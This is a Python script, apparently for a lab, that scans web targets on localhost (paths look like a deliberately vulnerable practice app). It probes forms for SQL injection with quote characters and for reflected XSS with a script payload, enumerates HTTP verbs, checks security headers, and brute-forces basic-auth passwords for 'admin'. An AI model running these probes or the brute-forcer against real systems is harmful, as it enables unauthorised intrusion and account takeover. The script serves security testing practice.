import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint


s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details



def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)



def is_vulnerable(response):
    """A simple boolean function that determines whether a page
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in response.content.decode().lower():
            return True
    # no error detected
    return False


def scan_sql_injection(url):
    """
    Takes url to check it's vulnerability to sql injections.
    Returns void, prints vulnerabilities to console.
    """
    # test on URL
    for c in "\"'":
        # add quote/double quote character to the URL
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        # make the HTTP request
        res = s.get(new_url)
        if is_vulnerable(res):
            # SQL Injection detected on the URL itself,
            # no need to preceed for extracting forms and submitting them
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    # test on HTML forms
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    # any input form that is hidden or has some value,
                    # just use it in the form body
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[input_tag["name"]] = f"test{c}"
            # join the url with the action (form request URL)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)
            # test whether the resulting page is vulnerable
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break


def scan_xss(url):
    """
    Given a `url`, it prints all XSS vulnerable forms and
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
            # won't break because we want to print available vulnerable forms
    return is_vulnerable



def check_api(url):
    """
    Checks for doable methods on web page.
    """
    print("API check:")
    verbs = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'TEST']
    for verb in verbs:
        req = requests.request(verb, url)
        print(verb, req.status_code, req.reason)
        if verb == 'TRACE' and 'TRACE / HTTP/1.1' in req.text:
            print('Possible Cross Site Tracing vulnerability found')
    print('----')


def server_info(url):
    """
    Scans header of url and if exists returns data about found values.
    """
    print("server information:")
    req = requests.get(url)
    headers = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Country-Code']

    for header in headers:
        try:
            result = req.headers[header]
            print('%s: %s' % (header, result))
        except Exception as error:
            print('%s: Not found' % header)
    print('----')


def header_report():
    """
    Checks vulnerabilities from url by looking at server configurations.
    """
    urls = open("urls.txt", "r")
    for url in urls:
        url = url.strip()
        req = requests.get(url)
        print(url, 'report:')
        try:
            xssprotect = req.headers['X-XSS-Protection']
            if xssprotect != '1; mode=block':
                print('X-XSS-Protection not set properly, XSS may be possible:', xssprotect)
        except:
            print('X-XSS-Protection not set, XSS may be possible')
        try:
            contenttype = req.headers['X-Content-Type-Options']
            if contenttype != 'nosniff':
                print('X-Content-Type-Options not set properly:', contenttype)
        except:
            print('X-Content-Type-Options not set')
        try:
            hsts = req.headers['Strict-Transport-Security']
        except:
            print('HSTS header not set, MITM attacks may be possible')
        try:
            csp = req.headers['Content-Security-Policy']
            print('Content-Security-Policy set:', csp)
        except:
            print('Content-Security-Policy missing')
    print('----')


def authentication():
    """
    BruteForcing machine that try to log in to admin account.
    """
    with open('passwords.txt') as passwords:
        for password in passwords.readlines():
            password = password.strip()
            req = requests.get('http://localhost/vulnerabilities/brute/',
                               auth=HTTPBasicAuth('admin', password))
            if req.status_code == 401:
                print(password, 'failed.')
            elif req.status_code == 200:
                print('Login successful, password:', password)
                break
            else:
                print('Error occurred with', password)
                break


if __name__ == '__main__':
    check_api('http://127.0.0.1')
    server_info('http://127.0.0.1')
    header_report()
    authentication()
    scan_xss('http://localhost/vulnerabilities/xss_r/')
    scan_sql_injection('http://localhost/vulnerabilities/sqli/')